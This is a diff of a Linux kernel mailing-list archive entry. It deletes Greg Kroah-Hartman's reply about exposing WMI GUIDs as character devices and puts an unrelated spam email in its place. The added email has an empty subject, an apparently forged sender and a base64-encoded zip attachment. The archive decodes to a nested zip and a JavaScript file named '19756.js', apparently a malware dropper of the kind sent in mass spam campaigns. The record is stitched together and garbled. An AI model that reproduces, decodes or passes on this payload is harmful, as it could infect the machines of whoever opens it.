@@ -1,54 +1,75 @@
-From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-Subject: Re: WMI and Kernel:User interface
-Date: Wed, 14 Jun 2017 06:38:53 +0200
-Message-ID: <20170614043853.GE10146@kroah.com>
-References: <201706101236.40663@pali>
- <20170612170249.GA27850@fury>
- <201706130017.29023@pali>
- <20170613012435.GB27850@fury>
- <20170613070535.GA13252@infradead.org>
- <20170613153857.GC27850@fury>
- <20170613155000.GA24483@kroah.com>
- <20170613162242.GF27850@fury>
- <20170613165247.GA32546@kroah.com>
- <20170613170719.GK27850@fury>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Wed, 14 Jun 2017 10:27:58 -0000
+Message-ID: <149743607862.14227.515614713671680074@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="92571547.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from mail.linuxfoundation.org ([140.211.169.12]:41144 "EHLO
-        mail.linuxfoundation.org" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1750728AbdFNEjD (ORCPT
+Received: from 122-121-242-140.dynamic-ip.hinet.net ([122.121.242.140]:55373
+        "HELO hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750728AbdFNK2D (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Wed, 14 Jun 2017 00:39:03 -0400
-Content-Disposition: inline
-In-Reply-To: <20170613170719.GK27850@fury>
+        Wed, 14 Jun 2017 06:28:03 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Darren Hart <dvhart@infradead.org>
-Cc: Christoph Hellwig <hch@infradead.org>, Pali =?iso-8859-1?Q?Roh=E1r?= <pali.rohar@gmail.com>, Linus Torvalds <torvalds@linux-foundation.org>, Mario Limonciello <mario_limonciello@dell.com>, Andy Shevchenko <andriy.shevchenko@linux.intel.com>, Rafael Wysocki <rjw@rjwysocki.net>, Andy Lutomirski <luto@amacapital.net>, LKML <linux-kernel@vger.kernel.org>, platform-driver-x86@vger.kernel.org
+To: platform-driver-x86@vger.kernel.org
 
-On Tue, Jun 13, 2017 at 10:07:19AM -0700, Darren Hart wrote:
-> On Tue, Jun 13, 2017 at 06:52:47PM +0200, Greg Kroah-Hartman wrote:
-> > > As a concrete example, Dell has specifically made the request that we
-> > > work on a solution that doesn't require them to come back to the kernel
-> > > community each time they add a WMI GUID to their BIOS. They would like
-> > > to see those GUIDs automatically exposed.
-> > 
-> > What do you mean exactly by "exposed"?  What do they do with these?  Why
-> 
-> By exposed I meant: the chardev for the WMI GUID is created
-> 
-> The idea being the kernel maps WMI GUIDs to chardevs and shepherds the
-> userspace calls through to the ACPI method evaluation and back. But the
-> kernel wmi driver doesn't, in general, have specific knowledge of the
-> methods or input and output formats.
-
-Hah, and those people who insist on "secure boot" are going to allow
-userspace access to ACPI methods like this?  Well, I guess as Windows
-does it, it must be ok...
-
-I'll shut up now and just wait for patches :)
-
-thanks,
-
-greg k-h
+UEsDBAoAAgAAAIOCzkrG8NyTrAsAAKwLAAAJABwAMTk3NTYuemlwVVQJAAPVDUFZ1Q1BWXV4CwAB
+BAAAAAAEAAAAAFBLAwQUAAIACACDgs5KhkaBYQYLAAD6IgAACAAcADE5NzU2LmpzVVQJAAPVDUFZ
+1Q1BWXV4CwABBAAAAAAEAAAAAO1a224byRF9tgH/gzEv5oiD3Z77DBgGCBbIW8AHP0oiMFdLa1sD
+cOmNFob/PXWqTnOGkrzWBkaCRWJjxGFfqutyqrqqm+Onu+54O929nnZumia3kj/TbtpF8meSlvDV
+y8+vXr44DMdPBxlknXt2bl69/PLq5Xgi4SYnvSv53Mm/aLdz+E8SvzaH1ztM3DmZ9+J4+E3+okN7
+brfBP5pjgJ4XHLVd3Q3/fP13Ul8FQtI5NwVRgBcZhDf5lCXkDXxZL3nl8MtgfbsObi458nrF7xx/
+vQovSC683gThQ+Yj8PC3w6H5bRVHSZRGwfhhmg5BeJleP+47NHf99FE7wxCyiHpedM2xu1kNh5Dy
+fpn1OevjTI/fwRTK/rSabIUzE2gfmBunw2qzCdUGZg6zh477eRtAQaIKEJEXJyoDNXf9wy+f2l+O
+h1USJWG4l+VB8FK16Ny12VBpvN8G3c0bUfncdNwG+OCkLTXIAeTtoeFhN4FWEB3Xgeg6cVmUllGc
+ZVGSiOKTPIpTF8WFvOdR4vC1iuKkkCEuSlI8SRRX8j1OwojSbEn18s1Hwd36/Tr48erq7efsy4/v
+ZIxT7Gyvgqsgothbt4HClHvfElFo6WPbX0j+hw/D3bvjjW9er/3Q9Tr8fDuu+O2vW2qC48PPM8Uv
+5GK9nQwRAt2f10G4+RKsgVJpWoXfeAtWJBIqtomG0NTdHobmvb4Ckmc4JRBut+7UfwZbj6EH7m+r
+zmBDg4j3wN/Z+sjMO2Da/BsLwL8tNPD7hrqHhrbqz4Lw21Cb77en6GMDIpILN2T6HhrIouBD8+sQ
+PMs7Z+6XYvqFzUmnc9eC0z2Qlq2PpRUiO0hL66rc8k9wpUiMBYmbmRMMvuTQ6xVHqlXJyINoFHyE
+YBKKkueGIs/8mbAKZre0KQAtetkGF/umudjn7mI/Dhf7Vp46v9gP7cW+k/eylPfenljaxkrGJxf7
+qrb+OJZ3zJdx4yjzhU6bybt8djInlf62snmxzGvQXsgcodXLE3fWlmF+bOuDXoN++SyERit0x/Ri
+74SvUdoqGVs39jjwI/My4afHe238j+BR2pOM/Gfkv7X1Ma6Xx0l7I+NzoT/KZyVPIzwM4FPGlp19
+h27ywt7BWyvPIGukQruSsXFJ3jG/M90MQj+T/ro2WfLO1urRJnP60uSvhIc8Nh4b6etG47mPuX5q
+Osd88ITvrbzXlbUNndkP/LSx6R3jO6FfUj9jbfI/d33YosvM/tCVrg8Z5amkvxpM/3ll9s5g4850
+r/ovjP+UeoH+4tFwUAv/dWvzoR+sBdtiDS83dAz7FYnZf5DHNSZHLetVBeYHa0GzIDhOjXOgAFxg
+BqwyQIqGKASqS0MhJKvls+6sP4c08mSYQ1qQEJrtE7MCpB6ERtwYUjCvE2n6zrwAKAZC0DdmZnF4
+hGoxNy2oFLlpo0q5PtoSk177aN0KqJVxXUorDiYP1oCloUVYri8WKIitr6msr6GWi8w8E4j0VgBS
+oSNvRVgZFlYUkf7JC1ujCb5dS/4ryl/P8qv+E/Kf2HqIFEARosBQnEcBlb+i9eGNna2JfvQBkb1H
+oUdRaTY6rY/IlBv9IjY0gRZkQ2TrktkLdP3OUKbypyYnZMJ8lR9oLwxhwEuP6NCbV3sUw/aKwtK8
+KKF9Ib9Gu9HkVi+QvgLvJSNNzPVhg84jWLVQGgqyhijuDKVYGVRKodb2RgVcDJXFUfgJtAQUYw58
+amA8AIfwBtBJW0MQtBJX5ksVaWgsry22ZNRGMxqKRtJXFFM7OeMbtAAEgT+gGB7iuH+01JDfL9KK
+KKrM0rAi5nexPeoFNTWUc/2RsexbVkwW8wubj1hYM55DR+VousR81xv/8L4+tVgJFC29+D+Hgj+z
+/T2C/4+C/2UU/Jntf4rB30ABdgqPgoJZxkCNY2eHlH5H1l0OGUlhOafmlqNZHvkZtOitoHnNwB29
+t0/Vfsz8qjZusSMqmqQtSWxHBz2flyGn8nm15rWjoUDH5bSiMxkVRaNZ+r+akXS2+ypKc1sf/MXj
+Yn1mD7AiaGtGlZkXdB0zAmf8Y9xJ/sws7NGqeamzOkHzytYQqllHx2xokZeCt4y200wiNtmBQtQl
+oA8PRV4Nz9CsA17giJ/R5PdRAFkV9KX6d8b/KaNhvYKsSGnWzKicrdkwYx0X8muGhbrqFIM136IW
+tTpgrNHqJjaOIIVS6SwWATHwwZj5mlqqZnWQmxYQJxRFo3HdEy0pkQntpKn5IrhUTWZEUU8tZqYB
+xDmMB4q1OqjNT5Oe1UE2xzLVDD4LsyBo+OpEY1E7VxdqReaLHeNRVs+xCNYee2qzszHIFxvGo+yp
+6jKzWJMTeRrLeosC4KH03pkw7tKCqB262tqgX60rMlZNsc3XWObmWIS4qHltYzrq6YUD9YB1lP/G
+PEP3gq94AXSl1XVvqIwH5vX0ImBCUcjqXlGYGvKAOtV/YfYHlrLM+EANdaprkoX8NW3Eyhc60r0s
+sQiTlwsvfDKKegRrLG3mWAotxuQYsRDcwpJACZC59EWtzqhRSKlnFB2lqGxHhdVb7rYjd6TywY7+
+3c8onHkBYgEQDiuiatQdrbDqEtqBV8XcnWueNWgs7MyK2DNO1U09exH2gob6gP40VhSLM5rKdKO6
+LZhR8ExBz3hQcZU8D2nmvcBHAT0biud9QlFUsF6XvrIhClI7jwEaoCOlWVnFDJ6xFwJFWj2n9ihf
+ntfK1uqZqWhGMbK6jC0z8nthtTijybi+njG1zAh4zoO1VP/1nNH46nxgNChTq/59FNEoWjKSZnaG
+BOQjCmh1v7AfzlFU/8kpBmtE/h0pWsswGu7kPqKntKzuSJ47ZiTwFc0oCtu5h2zOy6B1oByxtO4Z
+7/hZc1fR+cN5LNeTlj+iBZ6LnE7Kasa5zCwHdDY8HXTDg72gmE8YfY2ve0Fq+hqT2YuQSWleGxtd
+9bLC2tCPWLq0op40ZpzvTxoZBSry2TNXhEchlmlGU1h0wdqdYxTJF3ntE1Fo8HrkWlU/n5RhLwRN
+j8LTSVfDvNwxI2PWgL1C5WdGUTJvhm01I3IWZfxehr0IXpW7x2dMQCO88BTFeOIJD+jcvJdoXdLY
+XjCS7qw/j+B/R4t6UsbqACj3WvQ7OpAJLk4ZyR+J5YwPiI+5R1hnKP5mXs4Y2/uMIDbtO+ZnPiPw
+aFxmNH79npUZaPi8PEuYF9aGmoFeWjLWPievbbl7wkNGWirNeV49mowai2vuJalZH7l+1tkc5Z8V
+m1qxpfw5PS033de+LuDZdxnPlalGkZHntU9FocVJpz+n9bG8zeaT0orzkZGc5meL+V9BYcfzaY0i
+PPvW8+bx69Wl2pZRsGYV25cewZqXjKyuako62AoVdzSVwjGX622HHxgrNTtvTStJYQipmHFrLGel
+odVFYn76teze72gV8yLvRcMiFoJPxEqNOeO8UymKmQlUvJ1QLxhY4/bzjtSxGtNTc78js7qBF2os
+YEaSt8wWHmYUi+pMqztvxYX+wGfMMw5/66N1BT2zX1R3D6tTvR3Q6lavik9X/HoV9fj6XK+t7Vrf
+nV1HTrgWf3Qdqa2PLugmh3+8hLzfXgXu/ipYs/nyzXF6ezzc3r17c706v2P06z7vitFzdCYB73t3
+kO789t5uH5/4AcX9NgA7/AWFDXvqIt1+N3Grv53AF3/L6q/F3wbr+3Xw7vIqGK/wU4mr4KY5/CSv
+HH69IpVwvpzUmRQdDEfBYfr4U3B2IxlM/RCEl/EzbyNPcn6fH0b430Oc7jPDzb8AUEsBAh4DFAAC
+AAgAg4LOSoZGgWEGCwAA+iIAAAgAGAAAAAAAAQAAAKSBAAAAADE5NzU2LmpzVVQFAAPVDUFZdXgL
+AAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATgAAAEgLAAAAAFBLAQIeAwoAAgAAAIOCzkrG8NyTrAsA
+AKwLAAAJABgAAAAAAAAAAACkgQAAAAAxOTc1Ni56aXBVVAUAA9UNQVl1eAsAAQQAAAAABAAAAABQ
+SwUGAAAAAAEAAQBPAAAA7wsAAAAA
